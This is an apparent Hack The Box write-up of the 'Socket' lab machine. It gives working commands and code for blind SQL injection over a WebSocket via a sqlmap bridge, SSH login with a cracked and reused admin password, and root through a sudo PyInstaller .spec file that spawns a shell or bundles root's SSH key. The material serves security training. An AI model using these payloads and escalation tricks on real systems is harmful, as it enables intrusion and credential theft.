---
layout: post
title: "HTB: Socket"
subtitle: "blind SQLi over a Python WebSocket for admin creds, password reuse to SSH, then a sudo pyinstaller spec for root"
date: 2023-04-05
tags: [htb, linux, websocket-sqli, password-reuse, pyinstaller]
category: writeups
kind: machine
tldr: "The QReader app on ws.qreader.htb:5789 ran a Python websockets server with a blind SQL injection over SQLite, dumping admin:denjanjade122566. That password was reused for tkeller over SSH. Root came from a sudo build-installer.sh that runs pyinstaller on an attacker-supplied .spec file, which executes arbitrary Python as root."
---

## the box

Socket is a medium Ubuntu box running OpenSSH 8.9p1 on `22`, Apache `2.4.52` fronting a Werkzeug `2.1.2` / Python `3.10.6` app on `80`, and a Python `websockets` server on `5789`. The site distributes a desktop app, QReader, that talks to the WebSocket backend. The chain is: pull and decompile the client to learn the WebSocket protocol, find a blind SQL injection in it, bridge the socket to HTTP so sqlmap can dump the SQLite database, reuse the recovered admin password over SSH, then abuse a sudo build script that runs PyInstaller on a `.spec` file you control.

Target was `10.10.11.206`, tun0 was `10.10.16.4`.

## recon

Full sweep then a version scan. nmap fingerprinted `5789` as a websockets server:

```bash
nmap -p- --min-rate 10000 10.10.11.206
nmap -p 22,80,5789 -sCV 10.10.11.206
```

```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
5789/tcp open  unknown
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Server: Python/3.10 websockets/10.4
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
```

So `80` is a Flask app behind Apache (the `Werkzeug` header gives away the dev server proxied through), and `5789` is `websockets/10.4` on `Python/3.10`, which rejects anything that is not a proper WebSocket handshake. The site on `80` redirected to `qreader.htb`, so I added the hosts. The page text and the WebSocket naming point at a second vhost, `ws.qreader.htb`, for the socket itself:

```
10.10.11.206  qreader.htb ws.qreader.htb
```

The QReader site offers a desktop app download for both platforms, `QReader_lin_v0.0.2.zip` and `QReader_win_v0.0.2.zip`. Each archive holds an `app/qreader` executable plus a `test.png` (a QR code that decodes to `kavigihan`). That client is what talks to the WebSocket, so reversing it tells me the protocol.

## foothold

The Linux `qreader` is a PyInstaller `5.6.2` bundle, so I unpacked it and decompiled the entry script. `pyinstxtractor` extracts the frozen archive, and `pycdc` decompiles the resulting `qreader.pyc`:

```bash
python3 pyinstxtractor.py qreader
# extracts to qreader_extracted/
pycdc qreader_extracted/qreader.pyc > qreader.py
```

The decompiled source confirmed the host and the two endpoints. The client posts a JSON `version` field to `/version` and `/update`:

```python
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'

def version(self):
    response = asyncio.run(ws_connect(ws_host + '/version',
        json.dumps({'version': VERSION})))

def update(self):
    response = asyncio.run(ws_connect(ws_host + '/update',
        json.dumps({'version': VERSION})))
```

A quick manual probe with the python `websocket` client showed the `version` value flows into a query and is injectable, but the only feedback is the JSON response body, so this is blind SQLi over the WebSocket. Sending a UNION confirmed the column count and the backend:

```python
from websocket import create_connection
import json
ws_host = 'ws://qreader.htb:5789'
VERSION = '0.0.3" UNION SELECT "1","2","3","4";-- -'
ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
print(ws.recv())
ws.close()
```

The injection breaks out of a double-quoted string, four columns come back, and `sqlite_version()` in place of one of them confirmed SQLite rather than MySQL. The data lives in two tables, `users` (id, username, password, role) and `versions` (id, version, released_date, downloads).

To let sqlmap drive it I bridged the WebSocket to a local HTTP endpoint with a small middleware (the rayhan0x01 pattern). The two edits put my payload into the `version` field at the `/version` endpoint:

```python
ws_server = "ws://ws.qreader.htb:5789/version"
...
data = '{"version":"%s"}' % message
```

Run the middleware, then point sqlmap at the local endpoint on `8081`:

```bash
python3 exp.py
# [+] Starting MiddleWare Server
# [+] Send payloads in http://localhost:8081/?id=*

sqlmap -u "http://127.0.0.1:8081/?id=1" --batch --dbms sqlite --dump
```

That dumped the `users` table. The admin password stored as an MD5 hash (`0c6ba8fffc83b419b21e47cf63ce5cfb`) cracked to a plaintext:

```
admin:denjanjade122566
```

## user

The QReader content and the site's team page suggested other names to try (the QR code decoded to `kavigihan`, and a Thomas Keller showed on the about page). I built username variants from those:

```
json, tkeller, kthomas, thomask, mike, admin
```

The admin password was reused. Spraying the variants over SSH (or with crackmapexec / netexec), `tkeller` matched:

```bash
ssh tkeller@10.10.11.206
# tkeller:denjanjade122566
```

tkeller held the user flag.

## root

`sudo -l` allowed a build script as root with no password:

```bash
sudo -l
```

```
User tkeller may run the following commands on socket:
    (root) NOPASSWD: /usr/local/sbin/build-installer.sh
```

Reading the script, it takes an action and a filename. With action `build` and a `.spec` extension it runs PyInstaller directly on the file. It blocks symlinks but not the spec contents:

```bash
action=$1
name=$2
ext=$(/usr/bin/echo $2 | /usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]]; then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  ...
```

A PyInstaller `.spec` file is just Python that PyInstaller imports and executes at build time, so I put a shell escape in it:

```bash
echo 'import os; os.system("/bin/sh")' > pwn.spec
sudo /usr/local/sbin/build-installer.sh build pwn.spec
```

PyInstaller imported the spec and ran my code as root:

```
122 INFO: PyInstaller: 5.6.2
122 INFO: Python: 3.10.6
134 INFO: UPX is not available.
# whoami
root
```

That shell owned the root flag. If an interactive shell is awkward through that wrapper, the same spec can exfiltrate instead: PyInstaller bundles whatever you list in `datas`, so `datas=[('/root/root.txt','.'),('/root/.ssh/id_rsa','.')]` packs root's files into the resulting binary, which you then unpack with `pyinstxtractor`.

## takeaway

Two patterns drive this box. First, SQL injection hidden behind a WebSocket, exploited by reversing the client to learn the protocol and then fronting the socket with an HTTP middleware so an off-the-shelf tool works. Second, password reuse turning one dumped credential into SSH access. The root step is a reminder that build-tool config files are code: a sudo rule that runs PyInstaller on a user-supplied `.spec` is the same as a sudo rule that runs arbitrary Python as root.
